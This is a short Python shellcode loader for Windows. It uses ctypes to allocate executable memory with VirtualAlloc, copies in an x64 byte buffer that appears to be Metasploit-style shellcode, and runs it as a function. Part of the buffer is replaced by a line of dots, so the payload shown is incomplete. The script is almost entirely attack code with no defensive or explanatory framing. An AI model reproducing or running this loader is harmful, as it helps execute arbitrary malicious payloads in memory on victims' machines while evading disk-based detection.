import ctypes

api = ctypes.WinDLL('kernel32')
#############################################################
VirtualAlloc = api.VirtualAlloc
VirtualAlloc.argtypes = [
    ctypes.c_void_p,
    ctypes.c_size_t,
    ctypes.c_uint,
    ctypes.c_uint
]

VirtualAlloc.restype = ctypes.c_void_p
#############################################################
size = 2024

MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0X40

#############################################################
buf =  b""
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51"
buf += b"\x41\x50\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x51"
buf += b"\x48\x8b\x52\x18\x48\x8b\x52\x20\x56\x48\x0f\xb7"
buf += b"\x4a\x4a\x4d\x31\xc9\x48\x8b\x72\x50\x48\x31\xc0"
..........................................................
buf += b"\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6"
buf += b"\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
buf += b"\xf0\xb5\xa2\x56\xff\xd5"
#############################################################

sizes = len(buf)
ptr = api.VirtualAlloc(None,sizes,0x3000,PAGE_EXECUTE_READWRITE)
ctypes.memmove(ptr,bytes(buf),sizes)


func = ctypes.CFUNCTYPE(None)(ptr)

print("Shellcode...")
try:
    func()
    print("Shellcode run")
except Exception as e:
    print("error",e)